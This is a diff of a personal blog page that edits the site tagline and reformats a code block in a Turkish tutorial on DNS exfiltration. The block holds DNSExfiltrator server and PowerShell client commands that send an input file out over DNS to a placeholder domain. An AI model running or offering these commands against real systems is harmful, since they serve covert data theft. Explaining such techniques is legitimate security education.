@@ -22,7 +22,7 @@
 
 <header class="blog-header">
     <h1><a href="https://enesergun.net" class="glitch" data-text="Enes Ergün">Enes Ergün</a></h1>
-    <p> Personel homepage about of my Profession </p>
+    <p> Personel homepage </p>
     <nav>
         <a href="https://enesergun.net/">INDEX</a>
         <a href="https://enesergun.net/archives">ARCHIVES</a>
@@ -79,11 +79,10 @@ Nedir DNS'in çalışma mantığı?</p>
 <p>Server üzerinde 
 <code>dnsexfiltrator.py -d domain -p PAROLA</code></p>
 <p>Client üzerinde</p>
-<div class="highlight"><pre><span></span>c:\DNSExfiltrator&gt; powershell
-PS c:\DNSExfiltrator&gt; Import-Module .\Invoke-DNSExfiltrator.ps1
-PS c:\DNSExfiltrator&gt; Invoke-DNSExfiltrator -i inputFile -d mydomain.com -p password -s my.dns.server.com -t 500
-</pre></div>
-
+<div class="highlight"><pre><span></span><code><span class="c">c:\DNSExfiltrator&gt; powershell</span>
+<span class="err">PS c:\DNSExfiltrator&gt; Import-Module .\Invoke-DNSExfiltrator.ps1</span>
+<span class="err">PS c:\DNSExfiltrator&gt; Invoke-DNSExfiltrator -i inputFile -d mydomain.com -p password -s my.dns.server.com -t 500</span>
+</code></pre></div>
 
 <ul>
 <li>-i argümanı ile göndermek istediğiniz dosya </li>
